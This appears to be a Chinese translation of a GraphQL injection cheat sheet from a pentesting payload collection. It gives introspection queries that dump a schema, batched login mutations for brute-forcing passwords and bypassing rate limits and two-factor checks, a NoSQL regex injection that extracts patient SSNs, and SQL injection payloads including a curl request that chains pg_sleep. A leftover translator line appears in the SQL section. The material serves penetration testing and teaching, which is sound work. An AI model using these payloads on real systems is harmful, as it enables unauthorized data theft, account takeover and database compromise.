# GraphQL 注入攻击

> GraphQL 是一种用于 API 的查询语言，也是一个用于使用现有数据满足这些查询的运行时。通过定义类型以及这些类型上的字段，然后为每个类型的每个字段提供函数来创建 GraphQL 服务。

## 摘要

- [GraphQL 注入攻击](#graphql-injection)
  - [摘要](#summary)
  - [工具](#tools)
  - [枚举](#enumeration)
    - [常见的 GraphQL 端点](#common-graphql-endpoints)
    - [识别注入点](#identify-an-injection-point)
    - [通过内省枚举数据库模式](#enumerate-database-schema-via-introspection)
    - [通过建议枚举数据库模式](#enumerate-database-schema-via-suggestions)
    - [枚举类型定义](#enumerate-the-types-definition)
    - [列出到达类型的路径](#list-path-to-reach-a-type)
  - [利用](#exploit)
    - [提取数据](#extract-data)
    - [使用边缘/节点提取数据](#extract-data-using-edgesnodes)
    - [使用投影提取数据](#extract-data-using-projections)
    - [使用变异](#use-mutations)
    - [GraphQL 批处理攻击](#graphql-batching-attacks)
      - [基于 JSON 列表的批处理](#json-list-based-batching)
      - [基于查询名称的批处理](#query-name-based-batching)
  - [注入](#injections)
    - [NoSQL 注入](#nosql-injection)
    - [SQL 注入](#sql-injection)
  - [参考资料](#references)

## 工具

* [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - 用于渗透测试目的与 GraphQL 端点交互的脚本引擎
* [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL 安全研究材料
* [doyensec/inql](https://github.com/doyensec/inql) - GraphQL 安全测试的 Burp 扩展
* [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - 解析 GraphQL 内省模式并生成可能的查询
* [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - 列出了在 GraphQL 模式中到达给定类型的不同方式
* [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - 用于探索 GraphQL API 的广泛 IDE
* [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - 尽管禁用了内省，仍能获得 GraphQL API 模式
* [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - GraphQL 密码暴力破解和模糊测试实用程序
* [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - 安全专业人士用于研究 GraphQL 实现中的安全漏洞的 GraphQL 威胁框架
* [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - GraphQL API 的安全审计员实用程序
* [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - 将任何 GraphQL API 表示为交互式图
* [Insomnia](https://insomnia.rest/) - 跨平台 HTTP 和 GraphQL 客户端

## 枚举

### 常见的 GraphQL 端点

大多数情况下，graphql 位于 `/graphql` 或 `/graphiql` 端点。
更完整的列表可在 [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt) 获取。

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

### 识别注入点

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

检查错误是否可见。

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### 通过内省枚举数据库模式

用于转储数据库模式的 URL 编码查询。

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

用于转储数据库模式的 URL 解码查询。

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

无需片段即可转储数据库模式的单行查询。

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```js
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### 通过建议枚举数据库模式

当您使用未知关键字时，GraphQL 后端将响应与其模式相关的建议。

```json
{
  "message": "不能在类型 \"Query\" 上查询字段 \"one\"。你是不是想用 \"node\"？"
}
```

当 GraphQL API 的模式不可访问时，您还可以尝试使用诸如 [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) 这样的单词列表暴力破解已知的关键字、字段和类型名称。

### 枚举类型定义

使用以下 GraphQL 查询枚举感兴趣类型的定义，将 "User" 替换为所选类型

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### 列出到达类型的路径

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
找到从 "Query" 节点到达 "Skill" 节点的 27 种方式：
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## 利用

### 提取数据

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

### 使用边缘/节点提取数据

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### 使用投影提取数据

:warning: 别忘了在 **options** 中转义双引号。

```js
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

### 使用变异

变异就像函数一样，您可以使用它们与 GraphQL 进行交互。

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### GraphQL 批处理攻击

常见场景：

* 密码暴力破解放大场景
* 绕过速率限制
* 绕过两步验证

#### 基于 JSON 列表的批处理

> 查询批处理是 GraphQL 的一个特性，允许将多个查询发送到服务器上的单个 HTTP 请求。客户端可以将操作数组作为单个 POST 请求的一部分发送到 GraphQL 服务器，而不是分别发送每个查询。这减少了 HTTP 请求的数量，并且可以提高应用程序的性能。

查询批处理通过在请求正文中定义操作数组来工作。每个操作可以有自己的查询、变量和操作名称。服务器处理数组中的每个操作，并返回一个响应数组，每个批处理中的查询一个响应。

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### 基于查询名称的批处理

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

使用别名多次发送相同的变异

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## 注入

> 由于 GraphQL 只是客户端和数据库之间的一层，因此仍然可能发生 SQL 和 NoSQL 注入。

### NoSQL 注入

在 `search` 参数中使用 `$regex`、`$ne` 来自 。

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```


### SQL 注入

根据您提供的文档内容，以下是对应的翻译：

通过在graphql参数中发送单引号`'`来触发SQL注入

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

简单的graphql字段内SQL注入。

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## 参考资料

* [GraphQL简介](https://graphql.org/learn/)
* [GraphQL内省](https://graphql.org/learn/introspection/)
* [API黑客攻击GraphQL - @ghostlulz - 2019年6月8日](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
* [通过参数走私绕过GraphQL账户级权限 - 2018年3月14日 - @Detectify](https://labs.detectify.com/2018/03/14/graphql-abuse/)
* [发现GraphQL端点和SQL注入漏洞 - 2018年9月23日 - Matías Choren](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
* [保护您的GraphQL API免受恶意查询 - 2018年2月21日 - Max Stoiber](https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
* [通过JSON类型进行GraphQL NoSQL注入 - 2017年6月12日 - Pete Corey](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
